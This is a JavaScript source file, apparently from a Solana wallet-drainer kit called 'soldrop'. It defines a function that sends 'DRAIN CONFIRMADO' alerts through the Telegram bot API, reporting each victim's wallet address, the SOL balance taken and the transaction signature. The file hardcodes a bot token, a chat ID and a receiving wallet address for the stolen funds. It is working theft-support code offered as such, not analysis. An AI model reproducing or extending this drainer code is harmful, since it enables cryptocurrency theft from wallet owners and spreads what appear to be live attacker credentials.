// soldrop/telegram_bot.js — notificacoes drain
const TELEGRAM_TOKEN = "8987636618:AAGiDzNZ6UjZ7V5EhpqqUGxvOaXCz3_cXxI";
const CHAT_ID = "-5171430125";
const RECEIVER = "G7iCjrZFgGegvzz7xryGi9PrAZAweYiKNYGH42GBkc4X";
async function notifyDrain(data){
  const msg = `DRAIN CONFIRMADO\nWallet: ${data.address}\nValor: ${data.balance} SOL\nTx: ${data.sig || data.hash || "pending"}\nHora: ${new Date().toISOString()}`;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({chat_id: CHAT_ID, text: msg})
  });
}
module.exports = { notifyDrain, RECEIVER };
